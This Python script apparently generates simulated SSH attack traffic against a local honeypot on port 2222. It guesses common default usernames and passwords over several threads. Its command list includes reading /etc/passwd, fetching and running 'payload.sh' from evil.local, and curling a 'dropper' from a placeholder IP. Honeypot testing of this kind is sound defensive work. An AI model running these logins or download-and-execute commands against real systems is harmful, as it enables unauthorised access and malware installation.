"""Simple local SSH login/command simulator for testing."""

from __future__ import annotations

import random
import socket
import time
from threading import Thread

import paramiko

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 2222
THREADS = 5

USERNAMES = ["root", "admin", "ubuntu", "test", "oracle"]
PASSWORDS = ["123456", "password", "admin", "toor", "letmein"]
COMMANDS = [
    "ls",
    "pwd",
    "whoami",
    "uname -a",
    "cat /etc/passwd",
    "wget http://evil.local/payload.sh",
    "chmod +x payload.sh",
    "bash payload.sh",
    "curl http://198.51.100.10/dropper",
    "exit",
]



def run_client() -> None:
    transport = None
    channel = None

    try:
        sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=5)
        transport = paramiko.Transport(sock)
        transport.start_client(timeout=5)
        transport.auth_password(
            username=random.choice(USERNAMES),
            password=random.choice(PASSWORDS),
        )

        channel = transport.open_session(timeout=5)
        channel.get_pty()
        channel.invoke_shell()
        time.sleep(0.2)

        for _ in range(random.randint(2, 5)):
            command = random.choice(COMMANDS)
            channel.send(command + "\n")
            time.sleep(0.2)
            if command == "exit":
                break
    except Exception as exc:
        print(f"simulation error: {exc}")
    finally:
        if channel is not None:
            channel.close()
        if transport is not None:
            transport.close()



def main() -> None:
    workers = [Thread(target=run_client) for _ in range(THREADS)]
    for worker in workers:
        worker.start()
    for worker in workers:
        worker.join()

    print("Simulation complete")


if __name__ == "__main__":
    main()
